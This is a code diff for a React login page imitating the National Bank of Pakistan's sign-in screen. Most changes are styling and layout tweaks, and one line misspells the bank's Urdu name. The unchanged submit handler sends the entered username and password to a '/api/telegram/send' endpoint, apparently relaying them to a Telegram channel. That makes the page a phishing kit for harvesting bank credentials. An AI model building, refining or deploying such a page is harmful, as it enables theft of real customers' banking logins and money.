@@ -29,7 +29,7 @@ export default function LoginPage() {
     setSubmitting(true)
 
     try {
-      const data = saveSubmissionData({ username, password, rememberMe })
+      const data = saveSubmissionData({ username, password })
       await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
@@ -54,26 +54,25 @@ export default function LoginPage() {
             />
             <h1 className="mt-4 text-base font-medium text-[#555555]">National Bank of Pakistan</h1>
             <p className="mt-1 text-sm text-[#8a8a8a]" dir="rtl" lang="ur">
-              نیشنل بینک آف پاکستان
+              نیشتل بینک آف پاکستان
             </p>
           </div>
 
-          <div className="mt-8 text-left">
-            <h2 className="text-xl font-bold text-[#1a1a1a]">Welcome Back!</h2>
+          <div className="mt-7 text-left">
+            <h2 className="text-2xl font-bold text-[#1a1a1a]">Welcome Back!</h2>
             <p className="mt-1 text-sm text-[#8a8a8a]">Please sign in to your account</p>
           </div>
 
           <form className="mt-6" onSubmit={handleSubmit}>
-            <label htmlFor="username" className="block text-sm font-medium text-[#333333]">
+            <label htmlFor="username" className="block text-sm font-semibold text-[#333333]">
               Username
             </label>
             <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
-              <span className="pl-4 pr-3 text-[#8a8a8a]">
-                <User className="h-5 w-5" aria-hidden="true" />
+              <span className="pl-4 pr-2 text-[#8a8a8a]">
+                <User className="h-5 w-5" />
               </span>
               <input
                 id="username"
-                type="text"
                 autoComplete="username"
                 value={username}
                 onChange={(event) => {
@@ -81,16 +80,16 @@ export default function LoginPage() {
                   if (error) setError('')
                 }}
                 placeholder="Enter your username"
-                className="h-full w-full bg-transparent px-1 py-4 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
+                className="h-full w-full bg-transparent px-2 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
               />
             </div>
 
-            <label htmlFor="password" className="mt-5 block text-sm font-medium text-[#333333]">
+            <label htmlFor="password" className="mt-5 block text-sm font-semibold text-[#333333]">
               Password
             </label>
             <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
-              <span className="pl-4 pr-3 text-[#8a8a8a]">
-                <Lock className="h-5 w-5" aria-hidden="true" />
+              <span className="pl-4 pr-2 text-[#8a8a8a]">
+                <Lock className="h-5 w-5" />
               </span>
               <input
                 id="password"
@@ -102,36 +101,32 @@ export default function LoginPage() {
                   if (error) setError('')
                 }}
                 placeholder="Enter your password"
-                className="h-full w-full bg-transparent px-1 py-4 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
+                className="h-full w-full bg-transparent px-2 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
               />
               <button
                 type="button"
-                onClick={() => setShowPassword((value) => !value)}
-                className="px-4 text-[#8a8a8a]"
+                onClick={() => setShowPassword((prev) => !prev)}
+                className="pr-4 pl-2 text-[#8a8a8a]"
                 aria-label={showPassword ? 'Hide password' : 'Show password'}
               >
-                {showPassword ? (
-                  <EyeOff className="h-5 w-5" aria-hidden="true" />
-                ) : (
-                  <Eye className="h-5 w-5" aria-hidden="true" />
-                )}
+                {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
               </button>
             </div>
 
             {error && <p className="mt-2 text-xs font-medium text-[#c0392b]">{error}</p>}
 
             <div className="mt-4 flex items-center justify-between">
-              <label htmlFor="rememberMe" className="flex items-center gap-2 text-sm text-[#555555]">
+              <label htmlFor="remember-me" className="flex items-center gap-2 text-sm text-[#555555]">
                 <input
-                  id="rememberMe"
+                  id="remember-me"
                   type="checkbox"
                   checked={rememberMe}
                   onChange={(event) => setRememberMe(event.target.checked)}
-                  className="h-4 w-4 rounded border-[#d9d9d9] text-[#1f8a4c] focus:ring-[#1f8a4c]"
+                  className="h-4 w-4 rounded border-[#d9d9d9] text-[#1f8a4c] accent-[#1f8a4c]"
                 />
                 Remember Me
               </label>
-              <a href="#" className="text-sm font-medium text-[#1f8a4c] underline underline-offset-4">
+              <a href="#" className="text-sm font-semibold text-[#0d5228] underline underline-offset-4">
                 Forgot Password / Pin?
               </a>
             </div>
@@ -143,20 +138,20 @@ export default function LoginPage() {
             >
               {submitting ? 'Please wait…' : 'Sign In'}
             </button>
+
+            <div className="mt-6 flex items-center gap-3">
+              <span className="h-px flex-1 bg-[#e5e5e5]" />
+              <span className="text-xs font-medium text-[#8a8a8a]">OR</span>
+              <span className="h-px flex-1 bg-[#e5e5e5]" />
+            </div>
+
+            <p className="mt-4 text-center text-sm text-[#555555]">
+              Don&apos;t have an account?{' '}
+              <a href="#" className="font-semibold text-[#0d5228] underline underline-offset-4">
+                Register here
+              </a>
+            </p>
           </form>
-
-          <div className="mt-6 flex items-center gap-3">
-            <span className="h-px flex-1 bg-[#e0e0e0]" />
-            <span className="text-xs font-medium text-[#8a8a8a]">OR</span>
-            <span className="h-px flex-1 bg-[#e0e0e0]" />
-          </div>
-
-          <p className="mt-5 text-center text-sm text-[#555555]">
-            Don&apos;t have an account?{' '}
-            <a href="#" className="font-semibold text-[#1f8a4c] underline underline-offset-4">
-              Register here
-            </a>
-          </p>
         </section>
       </div>
     </main>
